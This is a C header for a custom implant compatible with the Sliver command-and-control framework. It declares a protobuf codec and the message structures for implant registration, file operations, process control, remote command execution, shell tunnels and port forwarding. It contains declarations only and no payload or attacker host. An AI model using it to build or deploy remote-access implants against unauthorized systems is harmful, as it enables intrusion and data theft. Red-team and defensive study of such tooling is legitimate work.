/* sliver/proto.h - minimal protobuf runtime and the Sliver messages the
 * implant needs first (Envelope, Register, Ping).
 *
 * Only the proto3 subset Sliver uses: varint, length delimited, fixed 32/64 if
 * ever needed. Unknown fields are skipped, so a newer server cannot break the
 * implant.
 */
#ifndef SLIVER_PROTO_H
#define SLIVER_PROTO_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* --- growable output buffer -------------------------------------------- */
typedef struct {
  uint8_t *data;
  size_t len;
  size_t cap;
  int failed;
} sliver_buf_t;

void sliver_buf_init(sliver_buf_t *b);
void sliver_buf_free(sliver_buf_t *b);
/* Appends raw bytes (no protobuf tag). */
int sliver_buf_append(sliver_buf_t *b, const void *data, size_t len);
int sliver_buf_put_varint(sliver_buf_t *b, uint64_t value);
int sliver_buf_put_tag(sliver_buf_t *b, uint32_t field, uint32_t wire_type);
int sliver_buf_put_bytes(sliver_buf_t *b, uint32_t field, const void *data, size_t len);
int sliver_buf_put_string(sliver_buf_t *b, uint32_t field, const char *s);
int sliver_buf_put_uint64(sliver_buf_t *b, uint32_t field, uint64_t value);
int sliver_buf_put_uint32(sliver_buf_t *b, uint32_t field, uint32_t value);
int sliver_buf_put_int64(sliver_buf_t *b, uint32_t field, int64_t value);
int sliver_buf_put_int32(sliver_buf_t *b, uint32_t field, int32_t value);
int sliver_buf_put_bool(sliver_buf_t *b, uint32_t field, int value);

/* --- input reader ------------------------------------------------------ */
typedef struct {
  const uint8_t *data;
  size_t len;
  size_t pos;
  int failed;
} sliver_reader_t;

void sliver_reader_init(sliver_reader_t *r, const void *data, size_t len);
int sliver_reader_next(sliver_reader_t *r, uint32_t *field, uint32_t *wire_type);
int sliver_reader_varint(sliver_reader_t *r, uint64_t *value);
int sliver_reader_bytes(sliver_reader_t *r, const uint8_t **data, size_t *len);
/* Copies a length delimited field into out (NUL terminated when cap allows). */
int sliver_reader_string(sliver_reader_t *r, char *out, size_t cap);
int sliver_reader_skip(sliver_reader_t *r, uint32_t wire_type);

/* --- Envelope ---------------------------------------------------------- */
typedef struct {
  int64_t id;
  uint32_t type;
  const uint8_t *data;
  size_t data_len;
  int unknown_message_type;
} sliver_envelope_t;

int sliver_envelope_encode(sliver_buf_t *out, int64_t id, uint32_t type,
                           const void *data, size_t data_len);
int sliver_envelope_decode(const void *data, size_t len, sliver_envelope_t *out);

/* --- Register ---------------------------------------------------------- */
#define SLIVER_REGISTER_MAX_STR 128

typedef struct {
  char name[SLIVER_REGISTER_MAX_STR];
  char hostname[SLIVER_REGISTER_MAX_STR];
  char uuid[SLIVER_REGISTER_MAX_STR];
  char username[SLIVER_REGISTER_MAX_STR];
  char uid[SLIVER_REGISTER_MAX_STR];
  char gid[SLIVER_REGISTER_MAX_STR];
  char os[16];
  char arch[16];
  int32_t pid;
  char filename[512];
  char active_c2[256];
  char version[32];
  int64_t reconnect_interval;
  char proxy_url[256];
  char config_id[64];
  int64_t peer_id;
  char locale[32];
  uint64_t capabilities;
} sliver_register_t;

int sliver_register_encode(sliver_buf_t *out, const sliver_register_t *reg);
int sliver_register_decode(const void *data, size_t len, sliver_register_t *out);

/* --- Ping -------------------------------------------------------------- */
int sliver_ping_encode(sliver_buf_t *out, int32_t nonce);
int sliver_ping_decode_nonce(const void *data, size_t len, int32_t *nonce);

/* --- Ls / LsReq (P1.1) -------------------------------------------------- */
#define SLIVER_FILE_MAX_NAME 256
#define SLIVER_FILE_MAX_LINK 256

typedef struct {
  char name[SLIVER_FILE_MAX_NAME];
  int is_dir;
  int64_t size;
  int64_t mtime;
  char mode[16];
  char link[SLIVER_FILE_MAX_LINK];
  char uid[16];
  char gid[16];
} sliver_file_info_t;

/* LsReq.Path (field 1); missing path yields an empty string. */
int sliver_ls_req_decode(const void *data, size_t len, char *path, size_t cap);
/* Ls{Path=1, Exists=2, Files=3, Response=9}. An empty commonpb.Response is
 * always emitted so the client's GetResponse() is non-nil. */
int sliver_ls_encode(sliver_buf_t *out, const char *path, int exists,
                     const sliver_file_info_t *files, size_t count);
/* Pwd{Path=1, Response=9}. */
int sliver_pwd_encode(sliver_buf_t *out, const char *path, const char *err);
/* PwdReq has no fields of interest; it only carries commonpb.Request (field 9).
 * Copies that nested blob when present. */
int sliver_request_field(const void *data, size_t len, const uint8_t **out, size_t *out_len);

/* --- Cd / Rm / Mkdir --------------------------------------------------- */
typedef struct {
  char path[1024];
  int recursive;
  int force;
} sliver_path_req_t;

/* CdReq{Path=1}, RmReq{Path=1,Recursive=2,Force=3}, MkdirReq{Path=1}. */
int sliver_path_req_decode(const void *data, size_t len, sliver_path_req_t *out);
/* Rm/Mkdir response: {Path=1, Response=9}. */
int sliver_path_resp_encode(sliver_buf_t *out, const char *path, const char *err);

/* --- Ps / Terminate ---------------------------------------------------- */
typedef struct {
  int32_t pid;
  int32_t ppid;
  const char *exe;
  const char *owner;
  int32_t session_id;
  const char *cmdline;
  const char *arch;
} sliver_proc_info_t;

/* Ps{Processes=1 repeated commonpb.Process, Response=9}. */
int sliver_ps_encode(sliver_buf_t *out, const sliver_proc_info_t *procs, size_t count,
                     const char *err);
/* TerminateReq{Pid=1, Force=2}. */
int sliver_terminate_req_decode(const void *data, size_t len, int32_t *pid, int *force);
/* Terminate{Pid=1, Response=9}. */
int sliver_terminate_encode(sliver_buf_t *out, int32_t pid, const char *err);

/* --- Env --------------------------------------------------------------- */
typedef struct {
  const char *key;
  const char *value;
} sliver_env_pair_t;

/* EnvInfo{Variables=1 repeated commonpb.EnvVar{Key=1,Value=2}, Response=9}. */
int sliver_env_encode(sliver_buf_t *out, const sliver_env_pair_t *vars, size_t count,
                      const char *err);
/* CurrentTokenOwner{Output=1, Response=9}. */
int sliver_current_token_owner_encode(sliver_buf_t *out, const char *who);

/* --- Cp / Mv / Chmod / Chtimes ----------------------------------------- */
/* CpReq/MvReq{Src=1, Dst=2}. */
int sliver_src_dst_decode(const void *data, size_t len, char *src, size_t src_cap, char *dst,
                          size_t dst_cap);
/* Cp{Src=1,Dst=2,BytesWritten=3,Response=9}. */
int sliver_cp_encode(sliver_buf_t *out, const char *src, const char *dst, int64_t written,
                     const char *err);
/* Mv{Src=1,Dst=2,Response=9}. */
int sliver_mv_encode(sliver_buf_t *out, const char *src, const char *dst, const char *err);
/* ChmodReq{Path=1,FileMode=2,Recursive=3}. */
int sliver_chmod_req_decode(const void *data, size_t len, char *path, size_t path_cap,
                            char *mode, size_t mode_cap, int *recursive);
/* ChtimesReq{Path=1,ATime=2,MTime=3}. */
int sliver_chtimes_req_decode(const void *data, size_t len, char *path, size_t path_cap,
                              int64_t *atime, int64_t *mtime);

/* --- Download / Upload -------------------------------------------------- */
#define SLIVER_DOWNLOAD_CHUNK (64 * 1024)

typedef struct {
  char path[1024];
  int64_t start;
  int64_t stop;
  int64_t max_bytes;
  int64_t max_lines;
  int recursive;
} sliver_download_req_t;

typedef struct {
  char path[1024];
  const void *data;
  size_t data_len;
  int overwrite;
  char file_name[256];
} sliver_upload_req_t;

/* DownloadReq{Path=1,Start=2,Stop=3,Recurse=4,MaxBytes=5,MaxLines=6}. */
int sliver_download_req_decode(const void *data, size_t len, sliver_download_req_t *out);
/* Download{Path=1,Encoder=2,Exists=3,Start=4,Stop=5,Data=6,IsDir=7,Response=9}. */
int sliver_download_encode(sliver_buf_t *out, const char *path, int exists, int64_t start,
                           int64_t stop, const void *data, size_t data_len, int is_dir,
                           const char *err);
/* UploadReq{Path=1,Encoder=2,Data=3,IsIOC=4,FileName=5,IsDirectory=6,Overwrite=7}. */
int sliver_upload_req_decode(const void *data, size_t len, sliver_upload_req_t *out);
/* Upload{Path=1,WrittenFiles=2,UnwriteableFiles=3,Response=9}. */
int sliver_upload_encode(sliver_buf_t *out, const char *path, int written, int failed,
                         const char *err);

/* --- Shell / Tunnel ----------------------------------------------------- */
#define SLIVER_SHELL_MAX_PATH 1024

typedef struct {
  char path[SLIVER_SHELL_MAX_PATH];
  int enable_pty;
  uint32_t pid;
  uint32_t rows;
  uint32_t cols;
  uint64_t tunnel_id;
} sliver_shell_req_t;

typedef struct {
  const void *data;
  size_t data_len;
  int closed;
  uint64_t sequence;
  uint64_t ack;
  uint64_t tunnel_id;
} sliver_tunnel_data_t;

/* ShellReq{Path=1,EnablePTY=2,Pid=3,Rows=4,Cols=5,TunnelID=8}. */
int sliver_shell_req_decode(const void *data, size_t len, sliver_shell_req_t *out);
/* Shell{Path=1,EnablePTY=2,Pid=3,TunnelID=8,Response=9}. */
int sliver_shell_encode(sliver_buf_t *out, const char *path, int pty, uint32_t pid,
                        uint64_t tunnel_id, const char *err);
/* TunnelData{Data=1,Closed=2,Sequence=3,Ack=4,TunnelID=8}. */
int sliver_tunnel_data_decode(const void *data, size_t len, sliver_tunnel_data_t *out);
int sliver_tunnel_data_encode(sliver_buf_t *out, const void *payload, size_t payload_len,
                              int closed, uint64_t sequence, uint64_t tunnel_id,
                              uint64_t ack);
/* Close terminal: carried in a MsgTunnelClose envelope, never in a data frame.
 * terminal_sequence is the exclusive prefix of frames we successfully sent. */
int sliver_tunnel_close_encode(sliver_buf_t *out, uint64_t terminal_sequence,
                               uint64_t tunnel_id);
/* Resend request: control frame (does not consume a data sequence). */
int sliver_tunnel_resend_encode(sliver_buf_t *out, uint64_t sequence, uint64_t tunnel_id,
                                uint64_t ack);
#define SLIVER_EXEC_MAX_ARGS 32

typedef struct {
  char path[1024];
  char args[SLIVER_EXEC_MAX_ARGS][512];
  size_t argc;
  int output;
  int background;
} sliver_execute_req_t;

/* ExecuteReq{Path=1,Args=2,Output=3,EnvInheritance=6,Background=8}. */
int sliver_execute_req_decode(const void *data, size_t len, sliver_execute_req_t *out);
/* Execute{Status=1,Stdout=2,Stderr=3,Pid=4,Response=9}. */
int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout_data,
                          size_t stdout_len, const void *stderr_data, size_t stderr_len,
                          uint32_t pid, const char *err);

/* --- message type ids (protobuf/sliverpb/constants.go, append only) ---- */
#define SLIVER_MSG_REGISTER 1u
#define SLIVER_MSG_PING 3u
#define SLIVER_MSG_LS_REQ 5u
#define SLIVER_MSG_LS 6u
#define SLIVER_MSG_CD_REQ 11u
#define SLIVER_MSG_PWD_REQ 12u
#define SLIVER_MSG_PWD 13u
#define SLIVER_MSG_RM_REQ 14u
#define SLIVER_MSG_RM 15u
#define SLIVER_MSG_MKDIR_REQ 16u
#define SLIVER_MSG_MKDIR 17u
#define SLIVER_MSG_PS_REQ 18u
#define SLIVER_MSG_PS 19u
#define SLIVER_MSG_TERMINATE_REQ 45u
#define SLIVER_MSG_TERMINATE 46u
#define SLIVER_MSG_ENV_REQ 66u
#define SLIVER_MSG_ENV 67u
#define SLIVER_MSG_DOWNLOAD_REQ 7u
#define SLIVER_MSG_DOWNLOAD 8u
#define SLIVER_MSG_UPLOAD_REQ 9u
#define SLIVER_MSG_UPLOAD 10u
#define SLIVER_MSG_EXECUTE_REQ 44u
#define SLIVER_MSG_SHELL_REQ 20u
#define SLIVER_MSG_SHELL 21u
#define SLIVER_MSG_TUNNEL_DATA 22u
#define SLIVER_MSG_TUNNEL_CLOSE 23u
#define SLIVER_MSG_SHELL_RESIZE_REQ 135u
#define SLIVER_MSG_CURRENT_TOKEN_OWNER_REQ 100u
#define SLIVER_MSG_MV_REQ 98u
#define SLIVER_MSG_MV 99u
#define SLIVER_MSG_CP_REQ 127u
#define SLIVER_MSG_CP 128u
#define SLIVER_MSG_CHMOD_REQ 109u
#define SLIVER_MSG_CHMOD 110u
#define SLIVER_MSG_CHTIMES_REQ 113u
#define SLIVER_MSG_CHTIMES 114u
#define SLIVER_MSG_CURRENT_TOKEN_OWNER 101u
#define SLIVER_MSG_PORTFWD_REQ 80u
#define SLIVER_MSG_PORTFWD 81u
#define SLIVER_MSG_BEACON_REGISTER 93u
#define SLIVER_MSG_BEACON_TASKS 94u

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_PROTO_H */







